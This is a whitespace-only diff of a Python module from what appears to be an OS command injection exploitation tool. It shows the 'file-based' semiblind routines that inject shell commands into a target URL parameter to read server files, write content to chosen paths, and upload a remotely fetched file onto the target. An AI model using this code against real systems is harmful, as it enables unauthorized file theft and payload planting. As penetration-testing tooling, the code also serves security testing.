@@ -28,15 +28,15 @@ from src.core.injections.semiblind_based.techniques.file_based import fb_injecto
  The "file-based" technique on Semiblind-based OS Command Injection.
 """
 
-def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
+def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
 
   #  Read file
   if menu.options.file_read:
     file_to_read = menu.options.file_read
     # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
@@ -60,7 +60,7 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
     if os.path.isfile(file_to_write):
       with open(file_to_write, 'r') as content_file:
         content = [line.replace("\n", " ") for line in content_file]
-      content = "".join(str(p) for p in content).replace("'","\"")
+      content = "".join(str(p) for p in content).replace("'", "\"")
     else:
       sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
       sys.stdout.flush()
@@ -73,14 +73,14 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
     else:
       dest_to_write = menu.options.file_dest
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_write + ")"
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
@@ -114,14 +114,14 @@ def do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,v
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_upload + ")"
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
